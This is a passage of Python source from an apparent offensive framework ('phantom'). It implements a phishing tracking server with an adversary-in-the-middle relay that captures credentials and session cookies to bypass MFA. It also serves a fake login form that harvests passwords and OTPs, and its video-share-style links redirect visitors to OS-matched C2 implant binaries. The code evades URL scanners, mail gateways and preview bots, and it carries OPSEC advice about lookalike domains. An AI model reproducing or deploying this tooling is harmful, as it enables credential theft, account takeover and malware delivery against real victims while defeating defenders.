                      fetcher: Optional[Callable] = None,
                      secure: bool = False) -> None:
        """Mount an AiTM relay for `code`: `/a/<code>` serves the REAL login
        page fetched from `upstream`, and `/a/<code>/p` relays the submission
        upstream while recording the credentials AND the session cookies the
        provider hands back (that is what defeats plain MFA).

        Requires `phishing.aitm` / `PHANTOM_AITM` (or a server built with
        `aitm=True`), a DOMAIN with TLS in front, and an authorization to test
        the service. `fetcher` is injectable so the relay is testable with no
        target.
        """
        if code and upstream:
            self._aitm[code] = {"upstream": upstream, "fetcher": fetcher,
                                "secure": bool(secure)}

    def _make_handler(self):
        store = self.store
        redirect_url = self.redirect_url
        brand = self.brand
        otp = self.otp
        skin = self.skin
        video_id = self.video_id
        videos = self._videos
        redirects = self._redirects
        images = self._images
        image_types = self._image_types
        players = self._players
        aitm_registry = self._aitm
        aitm_on = self.aitm
        login_page = _login_page(brand, otp)
        js_challenge = self.js_challenge
        salt = self._challenge_salt

        def video_page(code: str) -> str:
            meta = videos.get(code) or {}
            return _video_page(skin,
                               meta.get("id") or video_id, code,
                               title=meta.get("title", ""),
                               channel=meta.get("channel", ""))

        def preview_page(code: str) -> str:
            """The bare card a link-preview crawler receives: OG tags so the
            DM/mail renders a real video card, but no payload and no
            redirect. Nothing is written to the ledger."""
            meta = ((players.get(code) or {}).get("meta")
                    or videos.get(code) or {})
            # Always hand the crawler a REAL thumbnail: a card with no image
            # is the "broken share" look that makes the target suspicious.
            vid = meta.get("id") or video_id or _DEFAULT_VIDEO_ID
            return _video_page(skin, vid, code,
                               title=meta.get("title", ""),
                               channel=meta.get("channel", ""))

        def _resolve_payload(entry: Dict[str, Any], ua: str) -> str:
            """Pick the binary for THIS visitor from the platform map, falling
            back to the fixed payload. Missing platform -> linux default."""
            urls = entry.get("payloads") or {}
            if urls:
                return urls.get(platform_from_ua(ua)) or urls.get("linux") \
                    or entry.get("payload", "")
            return entry.get("payload", "")

        def player_page(code: str, ua: str) -> str:
            entry = players.get(code) or {}
            meta = entry.get("meta") or {}
            # the saved filename must be runnable for THIS visitor: the C2
            # serves the OS-matched binary, so the name has to match it
            name = download_name_for(
                code, platform_from_ua(ua),
                str(meta.get("download_name", "")))
            return _player_page(skin,
                                meta.get("id") or video_id, code,
                                _resolve_payload(entry, ua),
                                title=meta.get("title", ""),
                                channel=meta.get("channel", ""),
                                download_name=name)

        # -- AiTM relay (see phantom/automation/social/aitm.py) -------------

        def _split_headers(headers
                           ) -> Tuple[str, List[Tuple[str, str]]]:
            """(content-type, the rest) — `_send` sets the type itself."""
            ctype = ""
            rest: List[Tuple[str, str]] = []
            for k, v in headers or []:
                if (k or "").lower() == "content-type":
                    ctype = v
                else:
                    rest.append((k, v))
            return ctype, rest

        def _forward_cookies(raw: str) -> str:
            """The victim's cookies minus ours: they ARE the upstream session
            (we relayed them), so sending them back to the provider is what
            keeps the relay authenticated on every hop."""
            keep = [c.strip() for c in (raw or "").split(";")
                    if c.strip() and not c.strip().startswith("__p=")]
            return "; ".join(keep)

        def _aitm_proxy(handler, acode: str, entry: Dict[str, Any]):
            from phantom.automation.social.aitm import AuthProxy
            ip = handler.client_address[0]
            ua = handler.headers.get("User-Agent", "")

            def _sink(kind: str, payload: Dict[str, Any]) -> None:
                if kind == "creds":
                    store.record_cred(acode, ip, ua,
                                      payload.get("username", ""),
                                      payload.get("password", ""),
                                      payload.get("otp", ""))
                elif kind == "session":
                    store.record_session(acode, ip, ua,
                                         payload.get("cookies", ""),
                                         payload.get("username", ""))
            return AuthProxy(
                code=acode, upstream=entry.get("upstream", ""),
                fetcher=entry.get("fetcher"), sink=_sink,
                secure=bool(entry.get("secure")),
                our_host=handler.headers.get("Host", ""),
                cookie=_forward_cookies(handler.headers.get("Cookie", "")))

        def aitm_get(handler, acode: str, sub: str) -> None:
            entry = aitm_registry.get(acode) if aitm_on else None
            if not entry:
                # not mounted (or the relay is off): answer like any broken
                # endpoint, exactly the decoy a scanner already knows
                handler._send(502, _decoy_page().encode("utf-8"),
                              "text/html; charset=utf-8")
                return
            ip = handler.client_address[0]
            ua = handler.headers.get("User-Agent", "")
            store.record(acode, ip, ua, handler.headers.get("Referer", ""))
            proxy = _aitm_proxy(handler, acode, entry)
            status, headers, body = proxy.open_page(sub)
            ctype, rest = _split_headers(headers)
            handler._send(status, body,
                          ctype or "text/html; charset=utf-8", headers=rest)

        def aitm_post(handler, acode: str) -> None:
            entry = aitm_registry.get(acode) if aitm_on else None
            if not entry:
                handler._send(404, b"not found", "text/plain")
                return
            length = int(handler.headers.get("Content-Length", "0") or 0)
            raw = handler.rfile.read(length) if length else b""
            proxy = _aitm_proxy(handler, acode, entry)
            status, headers, body = proxy.submit(
                raw, handler.headers.get("Content-Type", ""))
            ctype, rest = _split_headers(headers)
            handler._send(status, body,
                          ctype or "text/html; charset=utf-8", headers=rest)

        class _Handler(BaseHTTPRequestHandler):
            # -- helpers --------------------------------------------------

            def _code(self) -> str:
                path = self.path.split("?")[0].strip("/")
                parts = path.split("/")
                return parts[-1] if parts else ""

            def _send(self, status: int, body: bytes, ctype: str,
                      headers: Optional[List[Tuple[str, str]]] = None) -> None:
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                for k, v in (headers or ()):
                    self.send_header(k, v)
                self.end_headers()
                try:
                    self.wfile.write(body)
                except OSError:
                    pass

            def _challenge_ok(self, code: str) -> bool:
                """True when the two-stage JS gate is satisfied (or off)."""
                if not js_challenge:
                    return True
                raw = self.headers.get("Cookie", "") or ""
                return f"__p={_challenge_token(code, salt)}" in raw

            def _send_redirect(self, location: str, status: int = 302) -> None:
                self.send_response(status)
                self.send_header("Location", location)
                self.send_header("Content-Length", "0")
                self.end_headers()

            # -- routes ---------------------------------------------------

            def do_GET(self):  # noqa: N802
                path = self.path.split("?")[0].strip("/")
                code = self._code()
                ip = self.client_address[0]
                ua = self.headers.get("User-Agent", "")
                # Asset routes are served BEFORE the crawler guard: a mail
                # image proxy must receive the image (a broken image is a
                # spam signal), it just is not counted as a human open.
                if path.startswith("px/"):
                    if code:
                        store.record_open(code, ip, ua,
                                          proxied=is_image_proxy(ua)
                                          or is_preview_bot(ua))
                    self._send(200, _PIXEL_GIF, "image/gif")
                    return
                if path.startswith("i/"):
                    # operator-chosen image lure: RENDERING the image is the
                    # zero-click hit — but only when the recipient's client
                    # loads it directly.
                    if code and code in images:
                        if is_image_proxy(ua) or is_preview_bot(ua):
                            store.record_open(code, ip, ua, proxied=True)
                        else:
                            store.record(code, ip, ua,
                                         self.headers.get("Referer", ""))
                        self._send(200, images[code],
                                   image_types.get(code, "image/jpeg"))
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if is_scanner(ua):
                    # URL-reputation scanner / secure-email gateway probing
                    # the lure: give it nothing to score. Serving the real
                    # page (or a redirect to the payload) is how the URL and
                    # the domain get flagged for every recipient.
                    if code:
                        store.record_open(code, ip, ua, proxied=True,
                                          scanner=True)
                    self._send(502, _decoy_page().encode("utf-8"),
                               "text/html; charset=utf-8")
                    return
                if is_preview_bot(ua):
                    # Platform crawler building the preview card: answer with
                    # the card only. No payload served, no code burned, no
                    # false "victim" in the ledger.
                    self._send(200, preview_page(code).encode("utf-8"),
                               "text/html; charset=utf-8")
                    return
                # two-stage JS gate: nothing that matters is served until the
                # client has executed the interstitial reload. A scanner gets
                # the interstitial (or the decoy above) and never sees the
                # lure, the credential form or the payload redirect.
                # AiTM relay: /a/<code> (login page) and /a/<code>/<asset>.
                # Deliberately BEFORE the JS gate: a real login page has no
                # interstitial, and serving the challenge would break the flow
                # the technique exists for. The mount's existence (registered
                # only when the operator enables it) is the gate.
                if path.startswith("a/"):
                    seg = path[len("a/"):].split("/", 1)
                    acode = seg[0]
                    sub = seg[1] if len(seg) > 1 else ""
                    if acode:
                        aitm_get(self, acode, sub)
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if js_challenge and not self._challenge_ok(code):
                    tok = _challenge_token(code, salt)
                    self._send(200, _challenge_page().encode("utf-8"),
                               "text/html; charset=utf-8",
                               headers=[("Set-Cookie",
                                         f"__p={tok}; Path=/; Max-Age=3600; "
                                         f"SameSite=Lax")])
                    return
                if path.startswith("l/"):
                    if code:
                        page = login_page.replace("__CODE__", code)
                        self._send(200, page.encode("utf-8"),
                                   "text/html; charset=utf-8")
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if path.startswith("v/"):
                    if code:
                        referrer = self.headers.get("Referer", "")
                        store.record(code, ip, ua, referrer)
                        page = video_page(code)
                        self._send(200, page.encode("utf-8"),
                                   "text/html; charset=utf-8")
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                # share-format video links: /reel/<code> (Instagram),
                # /shorts/<code> (YouTube), /@user/video/<code> and
                # /video/<code> (TikTok), /p/<code> (Instagram post).
                # These look like real shared-video URLs; the code is the
                # last path segment and there is no traceable profile id.
                if (path.startswith(("reel/", "shorts/", "video/", "@", "p/"))
                        and code):
                    referrer = self.headers.get("Referer", "")
                    if code in redirects:
                        # camouflaged beacon: a reel-looking URL that hands
                        # the compiled implant to the visitor. A per-platform
                        # map picks the OS-correct binary from the UA.
                        target = redirects[code]
                        if isinstance(target, dict):
                            target = (target.get(platform_from_ua(ua))
                                      or target.get("linux") or "")
                        store.record(code, ip, ua, referrer)
                        if target:
                            self._send_redirect(target)
                        else:
                            self._send(404, b"not found", "text/plain")
                        return
                    store.record(code, ip, ua, referrer)
                    if code in players:
                        # dropper-player: same reel-looking page, but the
                        # play click delivers the beacon (fail-soft: payload
                        # down = page looks like it won't load)
                        page = player_page(code, ua)
                    else:
                        page = video_page(code)
                    self._send(200, page.encode("utf-8"),
                               "text/html; charset=utf-8")
                    return
                if code and code in redirects:
                    # camouflaged delivery: e.g. a reel-looking link that
                    # silently hands the compiled beacon to the visitor
                    store.record(code, ip, ua,
                                 self.headers.get("Referer", ""))
                    self._send_redirect(redirects[code])
                    return
                if code:
                    referrer = self.headers.get("Referer", "")
                    store.record(code, ip, ua, referrer)
                self._send_redirect(redirect_url)

            def do_POST(self):  # noqa: N802
                path = self.path.split("?")[0].strip("/")
                code = self._code()
                if path.startswith("a/"):
                    seg = path[len("a/"):].split("/", 1)
                    acode = seg[0]
                    if acode and (seg[1] if len(seg) > 1 else "") == "p":
                        aitm_post(self, acode)
                    else:
                        self._send(404, b"not found", "text/plain")
                    return
                if not path.startswith("c/") or not code:
                    self._send(404, b"not found", "text/plain")
                    return
                length = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(length).decode("utf-8", "replace")
                form = urllib.parse.parse_qs(raw)
                store.record_cred(
                    code, self.client_address[0],
                    self.headers.get("User-Agent", ""),
                    (form.get("username") or [""])[0],
                    (form.get("password") or [""])[0],
                    (form.get("otp") or [""])[0])
                # never confirm success: bounce to "invalid credentials"
                page = (
                    f"<!DOCTYPE html><html><body style=\"font-family:Arial;"
                    f"margin:60px auto;max-width:360px;text-align:center\">"
                    f"<h2>Sign in</h2><p style=\"color:#c00\">The username or "
                    f"password you entered isn't correct.</p>"
                    f"<p><a href=\"/l/{code}\">Try again</a></p></body></html>")
                self._send(401, page.encode("utf-8"), "text/html; charset=utf-8")

            def log_message(self, *args, **kwargs):  # silence noisy logs
                pass

        return _Handler

    def start(self) -> "TrackingServer":
        """Bind and serve in a background thread. Idempotent and best-effort.

        The configured port may already be taken — most commonly by the C2
        listener itself, which historically defaulted to the same 8080.
        A silent failure there means every lure link points at a server
        nobody is listening on, so the tracker now AUTO-SHIFTS to the next
        free port and records the real one on `self.port` (the base URL is
        built from it). Only when no port in the window binds does the
        failure surface on `bind_error`.
        """
        if self._httpd is not None or self.running:
            return self
        tried = []
        for candidate in [self.port] + [self.port + i for i in range(1, 11)]:
            # explicit availability probe: ThreadingHTTPServer sets
            # allow_reuse_address, and on Windows SO_REUSEADDR lets a
            # SECOND socket bind an already-listening port (no exception,
            # traffic silently split). Probe without reuse first.
            if not _port_available(self.host, candidate):
                tried.append(candidate)
                self.bind_error = (f"port {candidate} already in use "
                                   "(C2 listener or another service)")
                continue
            try:
                self._httpd = ThreadingHTTPServer((self.host, candidate),
                                                  self._make_handler())
            except OSError as e:
                tried.append(candidate)
                self.bind_error = str(e)
                continue
            if candidate != self.port:
                self.port_shifted_from = self.port
                self.port = candidate
            self._thread = threading.Thread(target=self._httpd.serve_forever,
                                            daemon=True)
            self._thread.start()
            self.running = True
            self.bind_error = None
            return self
        self.running = False
        return self

    def stop(self) -> None:
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd.server_close()
            self._httpd = None
            self._thread = None
            self.running = False
            self.bind_error = None


def _port_available(host: str, port: int) -> bool:
    """True when nothing is already listening on host:port.

    Probed with a plain socket WITHOUT SO_REUSEADDR: on Windows the reuse
    flag lets a second socket bind a live port silently, which would make
    the tracker steal (and then lose) the C2's port.
    """
    import socket as _socket
    for h in ({host, "127.0.0.1"} if host in ("0.0.0.0", "", "::") else {host}):
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        try:
            s.bind((h, port))
        except OSError:
            return False
        finally:
            s.close()
    return True


def env_tracker() -> TrackingServer:
    """Build a TrackingServer from data/config.json (tracker.*) with legacy
    PHANTOM_TRACK_* environment variables taking precedence."""
    from phantom.utils import config as cfg
    host = str(cfg.get("tracker.host", "0.0.0.0", env="PHANTOM_TRACK_HOST"))
    try:
        port = int(cfg.get("tracker.port", "8080", env="PHANTOM_TRACK_PORT"))
    except (TypeError, ValueError):
        port = 8080
    redirect = str(cfg.get("tracker.redirect", "https://example.com",
                           env="PHANTOM_TRACK_REDIRECT"))
    brand = str(cfg.get("tracker.brand", "Account verification",
                        env="PHANTOM_TRACK_BRAND"))
    otp = str(cfg.get("tracker.otp", "0", env="PHANTOM_TRACK_OTP")) not in \
        ("0", "false", "no", "")
    skin = str(cfg.get("tracker.skin", "youtube", env="PHANTOM_TRACK_SKIN")) \
        .strip().lower()
    js_challenge = str(cfg.get("tracker.js_challenge", "0",
                               env="PHANTOM_TRACK_JS_CHALLENGE")) not in \
        ("0", "false", "no", "")
    return TrackingServer(host=host, port=port, redirect_url=redirect,
                          brand=brand, otp=otp, skin=skin,
                          js_challenge=js_challenge)


def detect_lan_ip() -> str:
    """This machine's LAN address, detected offline (no packet is sent —
    connecting a UDP socket only makes the OS pick the outbound
    interface). Returns '' when nothing usable is found."""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
        finally:
            s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    return ""


def tracker_is_public() -> bool:
    """True when a lure link would show a DOMAIN (internet-facing).

    A link exposing a raw IP (LAN or public) is operationally dead for
    social engineering: a SOC analyst reading the mail header sees an
    attacker box instead of a plausible service. Public URL = a domain
    (optionally with TLS), configured by the operator.
    """
    from phantom.utils import config as cfg
    configured = str(cfg.get("tracker.public_url", "",
                             env="PHANTOM_TRACK_URL")).strip()
    if not configured:
        return False
    host = configured.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
    if not host or host in ("localhost",):
        return False
    # an IP literal is NOT a public lure domain
    import re as _re
    if _re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
        return False
    return "." in host


def tracker_opsec_warnings() -> List[str]:
    """What a victim/SOC analyst would see in the lure link."""
    from phantom.utils import config as cfg
    from phantom.automation.social.tracker import public_base_url as _pb
    configured = str(cfg.get("tracker.public_url", "",
                             env="PHANTOM_TRACK_URL")).strip()
    if not configured:
        return [
            "tracker URL not set: lure links expose your OWN machine "
            f"(currently {_pb('0.0.0.0', 8080)}) — a SOC analyst sees an "
            "attacker address, not a plausible service. Set a DOMAIN "
            "(with TLS) before any real target."]
    w: List[str] = []
    if not configured.lower().startswith("https://"):
        w.append("tracker URL is not HTTPS: browsers flag plain HTTP "
                 "lures and mail gateways score them up.")
    host = configured.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
    import re as _re
    if _re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
        w.append("tracker URL is a bare IP: readable in every header — "
                 "use a domain (a throwaway lookalike domain is cheap).")
    return w


def public_base_url(host: str, port: int) -> str:
    """The URL victims will be sent to.

    An explicitly configured `tracker.public_url` always wins. Otherwise
    the bound host is used when it is an explicit, routable address, and
    localhost as the last resort — the LAN address is deliberately NOT
    inferred: silently putting the operator's box in a lure link is an
    OPSEC failure the framework must not make on its own. The transports
    gate refuses real lure delivery until a public URL exists (lab/CTF
    runs can opt in explicitly).
    """
    from phantom.utils import config as cfg
    configured = str(cfg.get("tracker.public_url", "",
                             env="PHANTOM_TRACK_URL")).strip()
    if configured:
        return configured.rstrip("/")
    if host and host not in ("0.0.0.0", "127.0.0.1", "localhost", ""):
        return f"http://{host}:{port}"
    return f"http://127.0.0.1:{port}"
